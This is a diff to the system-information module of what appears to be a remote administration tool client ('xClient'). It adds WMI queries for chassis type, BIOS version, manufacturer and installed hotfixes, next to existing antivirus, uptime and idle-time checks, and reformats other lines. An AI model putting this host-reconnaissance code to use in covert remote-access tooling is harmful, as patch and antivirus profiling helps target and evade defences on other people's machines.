@@ -30,10 +30,12 @@ namespace xClient.Core
         [StructLayout(LayoutKind.Sequential)]
         private struct LASTINPUTINFO
         {
-            public static readonly int SizeOf = Marshal.SizeOf(typeof (LASTINPUTINFO));
+            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
 
-            [MarshalAs(UnmanagedType.U4)] public UInt32 cbSize;
-            [MarshalAs(UnmanagedType.U4)] public UInt32 dwTime;
+            [MarshalAs(UnmanagedType.U4)]
+            public UInt32 cbSize;
+            [MarshalAs(UnmanagedType.U4)]
+            public UInt32 dwTime;
         }
 
         public static UserStatus LastStatus { get; set; }
@@ -114,7 +116,7 @@ namespace xClient.Core
                     foreach (ManagementObject mObject in searcher.Get())
                     {
                         double bytes = (Convert.ToDouble(mObject["TotalPhysicalMemory"]));
-                        installedRAM = (int) (bytes/1048576);
+                        installedRAM = (int)(bytes / 1048576);
                     }
                 }
 
@@ -149,6 +151,130 @@ namespace xClient.Core
             }
         }
 
+        public enum ChassisTypes
+        {
+            Other = 1,
+            Unknown,
+            Desktop,
+            LowProfileDesktop,
+            PizzaBox,
+            MiniTower,
+            Tower,
+            Portable,
+            Laptop,
+            Notebook,
+            Handheld,
+            DockingStation,
+            AllInOne,
+            SubNotebook,
+            SpaceSaving,
+            LunchBox,
+            MainSystemChassis,
+            ExpansionChassis,
+            SubChassis,
+            BusExpansionChassis,
+            PeripheralChassis,
+            StorageChassis,
+            RackMountChassis,
+            SealedCasePC
+        }
+
+        public static ChassisTypes GetSystemType()
+        {
+            try
+            {
+
+
+                ManagementClass systemEnclosures = new ManagementClass("Win32_SystemEnclosure");
+                foreach (ManagementObject obj in systemEnclosures.GetInstances())
+                {
+                    foreach (int i in (UInt16[])(obj["ChassisTypes"]))
+                    {
+                        if (i > 0 && i < 25)
+                        {
+                            return (ChassisTypes)i;
+                        }
+                    }
+                }
+                return ChassisTypes.Unknown;
+
+            }
+            catch
+            {
+                return ChassisTypes.Unknown;
+            }
+        }
+
+
+        public static string GetBIOSVer()
+        {
+            try
+            {
+                string biosVer = string.Empty;
+                string query = "SELECT * FROM Win32_BIOS";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        biosVer = mObject["Version"].ToString();
+                    }
+                }
+
+                return (!string.IsNullOrEmpty(biosVer)) ? biosVer : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+        public static string GetManufacturer()
+        {
+            try
+            {
+                string manufacturerName = string.Empty;
+                string query = "SELECT * FROM Win32_ComputerSystem";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        manufacturerName = mObject["Manufacturer"].ToString();
+                    }
+                }
+
+                return (!string.IsNullOrEmpty(manufacturerName)) ? manufacturerName : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+        }
+
+        public static string GetInstalledUpdate()
+        {
+            try
+            {
+                string HotfixID = string.Empty;
+                string query = "SELECT HotFixID FROM Win32_QuickFixEngineering";
+
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+                {
+                    foreach (ManagementObject mObject in searcher.Get())
+                    {
+                        HotfixID = mObject["HotFixID"].ToString() + " " + HotfixID;
+                    }
+                }
+
+                return (!string.IsNullOrEmpty(HotfixID)) ? HotfixID : "N/A";
+            }
+            catch
+            {
+                return "Unknown";
+            }
+
+
+        }
         public static string GetAntivirus()
         {
             try
@@ -199,7 +325,7 @@ namespace xClient.Core
 
         public static string GetUptime()
         {
-            int uptimeSec = Environment.TickCount/1000;
+            int uptimeSec = Environment.TickCount / 1000;
             TimeSpan result = TimeSpan.FromSeconds(uptimeSec);
             return string.Format("{0}d : {1}h : {2}m : {3}s", result.Days, result.Hours, result.Minutes, result.Seconds);
         }
@@ -297,10 +423,10 @@ namespace xClient.Core
         {
             uint idleTime = 0;
             LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
-            lastInputInfo.cbSize = (uint) Marshal.SizeOf(lastInputInfo);
+            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
             lastInputInfo.dwTime = 0;
 
-            uint envTicks = (uint) Environment.TickCount;
+            uint envTicks = (uint)Environment.TickCount;
 
             if (GetLastInputInfo(ref lastInputInfo))
             {
@@ -308,7 +434,7 @@ namespace xClient.Core
                 idleTime = envTicks - lastInputTick;
             }
 
-            idleTime = ((idleTime > 0) ? (idleTime/1000) : 0);
+            idleTime = ((idleTime > 0) ? (idleTime / 1000) : 0);
 
             return (idleTime > 600); // idle for 10 minutes
         }
